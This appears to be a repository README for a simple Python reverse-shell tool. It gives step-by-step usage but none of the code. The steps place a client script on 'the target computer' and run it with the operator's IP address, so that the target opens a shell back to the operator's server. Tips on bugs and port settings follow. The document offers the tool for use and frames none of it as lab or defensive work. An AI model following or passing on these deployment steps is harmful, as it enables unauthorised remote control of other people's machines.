This is a reverse shell in python. This isn't as good as netcat, but is in python so, yeah. 

1. Put the client.py file onto the target computer

2. Keep the server.py file on your computer

3. Run the server.py file (in CMD or terminal depending on what OS you are using) by using the command "python server.py" (without quotes)

4. Start the client.py file on the targets computer by using the command "python client.py <the ip address of the computer with the server.py script runnng (e.g python client.py 192.168.1.1)> (also without quotes)

And BOOM! Reverse shell. Now, it is far from perfect but it is version 1.0, so hopefully I will make better vsersions later on.

One of the major errors is the error that happens on the second command of every reverse shell. I am working trying to fix it, so stay tuned for the fixed version. (FIXED IN BUG FIX 1.0)

If you have any idea on how to fix this issue, letmy know in the issues section of the repository. 

If you are getting an error with the client connecting to you, change the SERVR_PORT variable in both server.py and client.py scripts to any port above 1024 as long as they are the same.
